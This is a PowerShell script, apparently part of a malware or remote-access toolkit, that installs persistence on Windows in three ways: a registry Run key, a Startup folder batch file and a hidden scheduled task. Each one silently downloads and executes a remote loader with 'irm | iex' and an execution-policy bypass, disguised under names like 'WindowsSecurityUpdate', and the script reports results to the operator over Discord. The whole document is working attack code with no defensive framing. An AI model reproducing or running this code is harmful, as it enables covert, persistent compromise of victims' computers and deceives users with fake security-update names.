# ============================================================
# Persistence Installer for Windows - Modular Remote Payload
# ============================================================
# Installs multiple persistence mechanisms
# ============================================================

$sysid = Get-SystemID

# Configuration
$payloadUrl = if ($env:U) { $env:U } else { "$global:BASE_URL/loaders/loader.ps1" }
$payloadCmd = "powershell -w h -ep bypass `"irm $payloadUrl|iex`""

$results = @()

# Method 1: Registry Run Key
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsSecurityUpdate"
    Set-ItemProperty -Path $regPath -Name $regName -Value $payloadCmd -Force
    $results += "✅ Registry Run Key"
} catch {
    $results += "❌ Registry Run Key: $($_.Exception.Message)"
}

# Method 2: Startup Folder
try {
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $batPath = "$startupPath\SecurityUpdate.bat"
    "@echo off`npowershell -w h -ep bypass -c `"$payloadCmd`"" | Out-File -FilePath $batPath -Encoding ASCII -Force
    $results += "✅ Startup Folder"
} catch {
    $results += "❌ Startup Folder: $($_.Exception.Message)"
}

# Method 3: Scheduled Task (requires admin)
try {
    $taskName = "WindowsSecurityHealthUpdate"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep bypass -c `"$payloadCmd`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet -Hidden
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    $results += "✅ Scheduled Task"
} catch {
    $results += "⚠️ Scheduled Task (needs admin)"
}

# Report
$report = "🔒 **Persistence Installed on $sysid**`n`n"
$report += "**Methods:**`n"
foreach ($r in $results) {
    $report += "• $r`n"
}

Send-Discord $report
